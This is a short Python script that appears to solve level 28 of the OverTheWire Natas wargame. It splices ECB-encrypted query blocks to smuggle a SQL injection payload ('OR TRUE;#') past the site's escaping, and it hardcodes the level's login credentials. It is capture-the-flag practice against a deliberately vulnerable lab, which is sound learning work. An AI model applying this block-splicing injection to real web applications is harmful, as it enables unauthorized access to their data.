from bs4 import BeautifulSoup
import requests
import urllib.parse
import base64

def make(url, auth, my_params):
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    return res

def writeResponse(response, enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(BeautifulSoup(response.text, 'html.parser').prettify())

def decipher(encStr):
    return base64.b64decode(urllib.parse.unquote(encStr)).hex()

def recipher(decStr):
    return urllib.parse.quote(base64.b64encode(bytes.fromhex(decStr)))


def urlQuery(url, auth, my_params):
    return decipher(make(url,auth,my_params).url[60:])

lvl_name = 'natas28'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
url = f'http://{lvl_name}.natas.labs.overthewire.org'

res1= urlQuery(url, lvl_pass, {"query":"X"*12})

res2=urlQuery(url, lvl_pass, {"query":"X"*11 + r"\' OR TRUE;#"})

print(recipher(res1[:-32]+res2[-32:]))
